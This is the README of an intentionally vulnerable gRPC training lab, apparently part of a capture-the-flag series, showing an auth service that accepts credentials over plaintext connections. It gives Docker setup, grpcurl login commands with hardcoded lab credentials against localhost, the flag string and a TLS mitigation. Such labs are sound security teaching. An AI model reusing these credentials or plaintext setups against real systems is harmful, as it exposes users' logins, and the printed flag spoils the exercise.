# Lab 002: Plaintext gRPC

## Vulnerability
Auth Service sending credentials over unencrypted gRPC connections.

## Objective
Successfully login to capture the flag (credentials are visible in plaintext).

## Run the Lab
```bash
# Build and run
docker build -t grpc-002 .
docker run -p 8002:8002 grpc-002
```

## Exploit
```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Intercept plaintext login (credentials visible in network traffic)
grpcurl -plaintext -d '{"username": "admin", "password": "admin123"}' \
  localhost:8002 auth.AuthService/Login

# Try other users
grpcurl -plaintext -d '{"username": "user", "password": "password123"}' \
  localhost:8002 auth.AuthService/Login

grpcurl -plaintext -d '{"username": "developer", "password": "dev456"}' \
  localhost:8002 auth.AuthService/Login
```

## Impact
Attackers can intercept and reuse credentials and session tokens sent over plaintext.

## Flag
Successfully login to get: `GRPC_GOAT{plaintext_credentials_intercepted}`

## Mitigation
Use TLS encryption for all gRPC communications.